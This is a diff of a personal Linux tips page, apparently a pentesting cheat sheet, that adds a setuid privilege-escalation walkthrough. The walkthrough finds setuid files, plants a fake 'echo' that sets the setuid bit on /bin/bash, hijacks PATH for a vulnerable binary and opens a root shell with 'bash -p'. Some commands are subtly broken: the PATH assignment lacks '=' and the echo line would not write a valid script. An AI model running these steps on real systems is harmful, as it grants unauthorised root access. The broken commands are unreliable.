@@ -1,5 +1,14 @@
-Linux
-=====
+---
+title: "Linux"
+description: "Linux tips"
+date: 20/11/2019
+categories:
+ - Linux
+tags:
+ - linux
+ - bash
+ - privesc
+---
 
 ### Wildcard
 
@@ -13,6 +22,38 @@ $ ls
 -al
 $ ls *
 -rw-rw-r-- 1 root root 0 jun 28 21:38 -al
+```
+
+
+### Privilege Escalation using PATH variables
+
+Here is a simple script to exploit privesc on a binary/script with setuid.
+
+First you search for vulnerable files:
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+If the script use commands with a relative path then. With `echo` for instance:
+
+```bash
+echo "#!/bin/bash\nchmod u+s /bin/bash" > echo
+chmod u+x echo
+PATH `pwd`:$PATH ./vuln_binary
+```
+
+This script add the setuid bit to `/bin/bash`:
+
+```bash
+#!/bin/bash
+chmod u+s /bin/bash
+```
+
+Then you run it with the following command:
+
+```bash
+/bin/bash -p
 ```
 
 
